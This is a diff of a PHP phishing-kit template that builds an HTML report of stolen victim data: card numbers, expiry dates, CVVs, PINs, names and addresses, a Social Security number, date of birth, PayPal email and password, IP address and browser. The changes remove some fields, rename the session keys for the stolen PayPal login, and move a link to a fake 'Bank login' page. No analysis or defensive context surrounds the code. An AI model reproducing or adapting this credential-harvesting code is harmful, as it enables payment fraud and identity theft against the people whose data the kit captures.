@@ -19,29 +19,18 @@ $Alali = "<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-
    <font style='color: rgb(128, 129, 131);'>&#10112; Expiration  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['expirationInput']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10113; Cvv         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['cardcodeInput']."</font>
 
-
-   <font style='color: rgb(128, 129, 131);'>&#10112; Card type   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['cc2type']."</font>
-   <font style='color: rgb(128, 129, 131);'>&#10113; Card number :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['cardnumber2Input']."</font>
-   <font style='color: rgb(128, 129, 131);'>&#10112; Expiration  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['expiration2Input']."</font>
-   <font style='color: rgb(128, 129, 131);'>&#10113; Cvv         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['cardcode2Input']."</font>
-   <font style='color: rgb(128, 129, 131);'>&#10112; 3D Secure :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['secure_CC2Input']."</font>
-   <font style='color: rgb(128, 129, 131);'>&#10113; Card PIN         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['pin2']."</font>
-
-
    <font style='color: rgb(128, 129, 131);'>&#10112; Full Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['fullnameInput']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10112; Address line  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['staddressInput']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['countryInput']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10112; City Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['cityInput']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10112; State line  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['stateInput']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10112; Zip Code  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['postal_codeInput']."</font>
-   
-   <font style='color: rgb(128, 129, 131);'>&#10112; Social security number :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['SSN']."</font>
-   <font style='color: rgb(128, 129, 131);'>&#10112; Date of Birth (DD/MM/YYYY)  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['dob']."</font>
-   
-   <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '/tnt3.html'>Bank login</a></font>
 
-<font style='color:#9c0000;'>℗</font> [PP Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
-<font style='color:#9c0000;'>℗</font> [PP Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
+   
+   <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '/sc2/tnt3.html'>Bank login</a></font>
+
+   <font style='color:#9c0000;'>℗</font> [PP Email] = <font style='color:#0070ba;'>".$_SESSION['Email']."</font><br>
+   <font style='color:#9c0000;'>℗</font> [PP Password] = <font style='color:#0070ba;'>".$_SESSION['Pass']."</font><br>
    <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_POST['REMOTE_ADDR']."'>".$_POST['REMOTE_ADDR']."</a></font><br> 
    <font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_POST['b']." On ".$_POST['os']."</font><br>
    
